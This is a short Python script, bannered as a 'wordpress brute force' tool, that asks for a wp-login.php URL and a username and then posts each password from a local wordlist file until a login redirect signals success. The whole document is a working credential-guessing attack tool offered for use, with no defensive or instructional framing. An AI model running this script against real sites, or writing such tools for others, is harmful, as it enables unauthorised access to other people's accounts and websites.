import requests
from termcolor import colored
print("#"*51)
print("#"*22," FTM ","#"*22)
print("#"*18," info@ftm.sa ","#"*18)
print("#"*13," wordpress brute force ","#"*13)
print("#"*51)
print(colored("URL Example -> https://example/wp-login.php", "blue"))

url=input("Enter URL: ")
user=input("Enter Username: ")

with open("pass.txt") as f:
    for line in f:
        password = line.strip()
        data = {"log": user, "pwd": password}
        response = requests.post(url, data=data)
        if response.url != url:
            print(colored(password + " OK", "green"))
            break
        else:
            print(colored(password + " ERROR", "red"))
